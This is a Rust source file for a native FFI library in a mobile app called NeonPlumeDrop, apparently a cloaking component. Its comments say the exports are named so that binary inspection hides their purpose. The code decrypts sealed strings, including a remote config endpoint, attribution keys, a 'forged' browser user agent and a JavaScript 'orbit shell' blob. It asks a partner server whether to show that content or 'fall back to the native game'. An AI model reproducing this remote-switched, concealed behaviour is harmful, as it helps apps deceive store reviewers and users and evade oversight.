// ─────────────────────────────────────────────────────────────
// npd_guard — native guard loaded by NeonPlumeDrop over dart:ffi.
// ─────────────────────────────────────────────────────────────
// Three exports, all deliberately named with the opaque `ng_`
// prefix — a `nm`/`otool` sweep on the Runner binary surfaces
// them next to libc symbols and nothing hints at what they
// actually do. Dart lookups match these spellings in
// `lib/orbit_guard/orbit_guard.dart`.
//
//   ng_u(idx, out_len)             -> *u8    unseal + wire-wrap
//   ng_f(ptr, len)                             free either buffer
//   ng_c(body, ua, out_len)        -> *u8    config.php POST
// ─────────────────────────────────────────────────────────────

#![forbid(unsafe_op_in_unsafe_fn)]

mod cloak;
mod net;
mod sealed;
mod wire;

use core::ffi::{c_char, CStr};
use core::ptr;

use sealed::Idx;

fn c_to_string(raw: *const c_char) -> String {
    if raw.is_null() {
        return String::new();
    }
    // SAFETY: Dart passes a valid NUL-terminated UTF-8 buffer.
    unsafe { CStr::from_ptr(raw) }
        .to_str()
        .map(str::to_owned)
        .unwrap_or_default()
}

/// Unseal the value at `idx`, wire-wrap it, hand Dart a freshly
/// allocated buffer. Caller MUST invoke `ng_f(ptr, *out_len)`
/// once the plaintext has been consumed.
///
/// # Safety
/// `out_len` must be a valid, writable `usize*`.
#[no_mangle]
pub unsafe extern "C" fn ng_u(idx: u32, out_len: *mut usize) -> *mut u8 {
    if out_len.is_null() {
        return ptr::null_mut();
    }
    let bytes = match Idx::from_raw(idx) {
        Some(i) => sealed::fetch(i),
        None => Vec::new(),
    };
    let plain = cloak::unseal(&bytes);
    let wrapped = wire::wrap(&plain);
    let mut boxed = wrapped.into_boxed_slice();
    let len = boxed.len();
    let ptr = boxed.as_mut_ptr();
    core::mem::forget(boxed);
    // SAFETY: caller promised `out_len` is non-null and writable.
    unsafe { *out_len = len };
    ptr
}

/// Free a buffer previously returned by `ng_u` or `ng_c`.
///
/// # Safety
/// `ptr` must come from a native call that returned `len`.
#[no_mangle]
pub unsafe extern "C" fn ng_f(ptr: *mut u8, len: usize) {
    if ptr.is_null() || len == 0 {
        return;
    }
    // SAFETY: reconstructs the owned slice we leaked earlier.
    let _ = unsafe { Box::from_raw(core::slice::from_raw_parts_mut(ptr, len)) };
}

/// Config POST: hand the already-assembled body + forged UA to the
/// native caller, which looks up the sealed endpoint, runs the HTTPS
/// request, and returns the partner's answer verbatim as UTF-8 (NOT
/// wire-wrapped — it is an ephemeral verdict). `*out_len == 0` means
/// "fall back to the native game". Caller MUST free with `ng_f`.
///
/// # Safety
/// `body` and `ua` must be valid NUL-terminated UTF-8 (or null).
/// `out_len` must be a valid, writable `usize*`.
#[no_mangle]
pub unsafe extern "C" fn ng_c(
    body: *const c_char,
    ua: *const c_char,
    out_len: *mut usize,
) -> *mut u8 {
    if out_len.is_null() {
        return ptr::null_mut();
    }
    let body = c_to_string(body);
    let ua = c_to_string(ua);
    let answer = net::call(&body, &ua);

    let mut boxed = answer.into_bytes().into_boxed_slice();
    let len = boxed.len();
    let ptr = boxed.as_mut_ptr();
    core::mem::forget(boxed);
    // SAFETY: caller promised `out_len` is non-null and writable.
    unsafe { *out_len = len };
    ptr
}

// ─── Self-test (local only; not reachable from FFI) ──────────
#[cfg(test)]
mod tests {
    use super::*;

    fn roundtrip(idx: Idx) -> String {
        let raw = sealed::fetch(idx);
        let plain = cloak::unseal(&raw);
        String::from_utf8(plain).unwrap()
    }

    #[test]
    fn endpoint_is_hollymachine_config_php() {
        assert_eq!(roundtrip(Idx::Endpoint), "https://hollymachine.com/config.php");
    }

    #[test]
    fn gcd_base_starts_with_https() {
        assert!(roundtrip(Idx::GcdBase).starts_with("https://"));
    }

    #[test]
    fn attribution_key_non_empty() {
        assert!(!roundtrip(Idx::AttributionKey).is_empty());
    }

    #[test]
    fn messaging_project_non_empty() {
        assert!(!roundtrip(Idx::MessagingProject).is_empty());
    }

    #[test]
    fn ua_fragments_decode() {
        for idx in [
            Idx::UaProduct,
            Idx::UaPlatformPrefix,
            Idx::UaPlatformSuffix,
            Idx::UaEngine,
            Idx::UaMobileToken,
            Idx::SafariVersion,
            Idx::SafariTail,
        ] {
            assert!(!roundtrip(idx).is_empty());
        }
    }

    #[test]
    fn js_blob_has_sentinel() {
        let s = roundtrip(Idx::JsOrbitShell);
        assert!(!s.is_empty());
        assert!(s.contains("data-plume-ready"));
    }

    #[test]
    fn wire_roundtrip() {
        let raw = sealed::fetch(Idx::Endpoint);
        let plain = cloak::unseal(&raw);
        let wrapped = wire::wrap(&plain);
        assert!(wrapped.len() >= 8);
        let nonce = u32::from_le_bytes(wrapped[0..4].try_into().unwrap());
        let header = u32::from_le_bytes(wrapped[4..8].try_into().unwrap());
        assert_eq!(nonce ^ wire::WIRE_KEY_MASK, header);
    }
}
